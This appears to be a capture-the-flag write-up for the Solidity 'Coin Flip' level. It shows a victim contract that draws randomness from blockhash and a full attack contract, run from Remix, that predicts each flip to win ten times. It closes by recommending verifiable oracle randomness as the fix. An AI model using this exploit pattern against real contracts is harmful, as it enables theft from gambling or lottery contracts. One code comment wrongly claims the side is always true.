# Coin Flip Challenge - Level 3

<p align="left"> <img src="https://komarev.com/ghpvc/?username=Level3&label=Repository%20views&color=0e75b6&style=flat" alt="wrappedusername" /> </p>

```yml
This smart contract has a vulnerability, because:
```

- The player can use every variable that the victim contract uses to guess the correct side each time,
  - because everything on the blockchain is currently public and visible, so anyone can find these exact values the victim contract uses.
  - ⚠️ Using blockhash as a source of randomness is basicly leaving your keys in full view, out in public, for anyone to find and use.  

```Solidity
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
function flip() public returns(bool) {
      
uint256 blockValue = uint256(blockhash(block.number -1)); // <----- NOT random at all! 
       
uint256 coinFlip = uint256(blockValue/FACTOR);
      
bool side = coinFlip == 1 ? true : false;
```

## 🆘 The victim contract in detail

```yml
The victim contract:
```
- FACTOR is part of the vulnerability because it is used to help determine the source of randomness and,
  - it is publicly available,

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; // <---- used in attack!

  constructor() {
    consecutiveWins = 0;
  }
```

- the other vulnerabilities are found in this section of the victim contract,

```Solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1)); // <----- NOT random at all, used in attack!

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR; // <----- used in attack!
    bool side = coinFlip == 1 ? true : false; // <----- used in attack!

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

```

## ⚠️ The vulnerability in detail

```yml
The vulnerability:
```

- [Globally Available Variables](https://docs.soliditylang.org/en/v0.8.17/units-and-global-variables.html?highlight=global%20variables#special-variables-and-functions) *SHOULD NOT* be used as a source of randomness, because they,
  - always exist in the global namespace because they are,
    - mainly used to provide information about the blockchain and,
    - are general-use utility functions.

```Solidity
  uint256 blockValue = uint256(blockhash(block.number - 1)); // <----- NOT random at all!
```

## 💥 The attack contract in detail:

```yml
The attack contract starts with importing the victim contract:
```
- this will be used in the attack contract's constructor,

```Solidity
// SPDX-License-Identifier: MIT
// fixed pragma
pragma solidity 0.5.0; 

import "./CoinFlip.sol";
// outdated import for SafeMath, pragma 0.8.0 has SafeMath included in version
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

/// @title attack contract, calculates correct side 10 times in a row
/// @author Web3 Blockchain Developer 
contract CoinFlipAttack {
    /** 
    * @notice Using for directive, using imported SafeMath functions from openzeppelin,
    * for unit256 to prevent overflow and underflow attacks. 
    */
    using SafeMath for uint256;
```
- the public state variable victimContract references the victim contract as CoinFlip and will be assigned by the player when the attack contract is deployed using the constructor,
- the attack contract also uses the state variable FACTOR from the victim contract,
- the constructor receives the victim contract address from the player and references the victim contract with CoinFlip(_victimContractAddr), this address is assigned as the public state variable victimContract,

```Solidity
/// @notice public state variable assigned in constructor
    CoinFlip public victimContract; 
    
    // state variable assigned in function flip()
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    /** 
    * @notice victim address belonging to CoinFlip assigned as public state variable victimContract 
    * during deployment of attack contract 
    */
    constructor(address _victimContractAddr) public {
        victimContract = CoinFlip(_victimContractAddr);
    }
```

```yml
```

```Solidity

/**  
* @notice Blockhash and block.number are globally accessible variables available to everyone, 
* this is the source of randomness and can be exploited in the attack to calculate the correct side of the coin flip.
* The best practice in this case would be to introduce a source of randomness into a contract with a 
* decentralized oracle to compute random numbers, because there is no native way to generate random numbers in 
* Solidity and everything is publicly visible in the contract.
*/
/// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
function flip() public returns(bool) {
  uint256 blockValue = uint256(blockhash(block.number.sub(1)));
  
  uint256 coinFlip = blockValue.div(FACTOR); 
        
  bool side = coinFlip == 1 ? true : false;

  victimContract.flip(side);
    }
}

```

## 💥 The attack in detail

```yml
The attack:
```

- Everything from the victim contract is just copied and pasted into our attack contract's flip function,

```Solidity
/// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
function flip() public returns(bool) {
  uint256 blockValue = uint256(blockhash(block.number.sub(1))); // <----- NOT random at all!
  
  uint256 coinFlip = blockValue.div(FACTOR); // <-----  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        
  bool side = coinFlip == 1 ? true : false; // <----- player's coinFlip will always equal true!

  victimContract.flip(side); // <----- attack contract interacts with victim contract calling it's flip function passing our always true side.
    }
```

- finally the attack begins,
- after the attack contract finds the value for the flip it is assigned to the call, victim contract's flip function,
    - the player calls this flip function 10 times in a row to win.


## 💥 The attack contract locked and loaded in REMIX IDE

```yml
Fire away at that flip button, ten times:
```
- lower left of the image, under the Deployed Contracts section, orange button labeled flip.

<p align="left" >
<img width="506" height="512" src="https://user-images.githubusercontent.com/104662990/199078205-0c19814b-c867-46bf-8b1e-9404585037af.png">
</P>

## 🩺 How can we fix this vulnerablity in the victim contract?

- Use a decentralized oracle network for the source of randomness.

```yml
Like this:
```

- [verifiable source of randomness for smart contract developers](https://chain.link/vrf)




    
    
